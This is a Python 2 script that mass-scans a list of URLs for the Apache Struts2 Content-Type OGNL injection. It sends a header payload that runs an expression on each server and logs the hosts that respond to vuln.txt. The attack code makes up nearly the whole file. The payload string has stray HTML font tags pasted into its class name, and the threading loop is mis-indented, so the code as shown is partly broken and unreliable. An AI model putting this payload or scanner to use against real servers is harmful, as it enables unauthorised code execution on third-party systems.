#!/usr/bin/env python
#coding:utf8

import sys
import requests
requests.packages.urllib3.disable_warnings()
import ssl
import threading


def poccheck():
        ssl._create_default_https_context = ssl._create_unverified_context
        while True:
                lock.acquire()
                url = inFile.readline().replace('\n','')
                lock.release()
                proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080", }   
        
                url = url.replace('\n','')
                print url
                result = False
                header = {
                        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
                        'Content-Type':"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.<strong><font color=\"#FF0000\">struts</font></strong>2.ServletActionContext@getResponse().getWriter()).(#o.println(88888888-23333+1222)).(#o.close())}"
                }
                postdata = ""
                try:
                        response = requests.post(url,data=postdata,headers=header,verify=False,allow_redirects = False,proxies=proxies)
                        if response.status_code==200 and response.content.find("88866777")!=-1:
                                lock.acquire()
                                result = True
                                print result
                                outFile = open('vuln.txt','a+')
                                outFile.write(url)
                                outFile.close()
                                lock.release()
                except Exception as e:
                        print str(e)
                        #pass
                else:
                        print False
                #return result

if __name__ == '__main__':
        if len(sys.argv) == 2:
                inFile = open (sys.argv[1],'r')
                lock = threading.Lock()
                #file = open('outproxy.txt','r')
                all_thread = []
                for i in range(20):
                        t = threading.Thread(target=poccheck)
                all_thread.append(t)
                t.start()
    
                for t in all_thread:
                    t.join()
                inFile.close()
        #print poccheck(sys.argv[1])
                sys.exit(0)
        else:
                print ("usage: %s urls.txt" % sys.argv[0])
                sys.exit(-1)
